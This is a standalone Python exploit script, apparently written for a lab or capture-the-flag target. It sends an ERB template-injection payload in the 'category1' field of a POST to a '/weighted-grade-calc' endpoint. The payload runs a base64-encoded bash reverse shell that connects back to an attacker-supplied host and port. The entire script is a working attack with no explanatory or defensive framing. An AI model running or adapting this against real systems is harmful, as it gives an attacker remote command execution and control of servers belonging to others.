import requests
import sys
import base64
import urllib.parse

if len(sys.argv) < 4:
    print(f"Usage: python3 {sys.argv[0]} <url> <lhost> <lport>")
    sys.exit(1)

base_url = sys.argv[1].rstrip('/')
lhost = sys.argv[2]
lport = sys.argv[3]

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded"
}

payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

b64 = base64.b64encode(payload.encode()).decode()

encoded = urllib.parse.quote(b64, safe='')
payload2 = f"a <%= system(\"echo {encoded} | base64 --decode | bash\")%>"

params = {
    "category1": payload2,
    "grade1": "1",
    "weight1": "20",
    "category2": "test1",
    "grade2": "2",
    "weight2": "20",
    "category3": "test2",
    "grade3": "5", 
    "weight3": "20",
    "category4": "test3", 
    "grade4": "5", 
    "weight4": "20",
    "category5": "test4",
    "grade5": "6",
    "weight5": "20"
}

attack_url = base_url + "/weighted-grade-calc"

print(f"[*] Sending payload to {attack_url}...")
res = requests.post(
    attack_url,
    headers=headers,
    data=params
)

print(f"Status: {res.status_code}")
print(res.text)
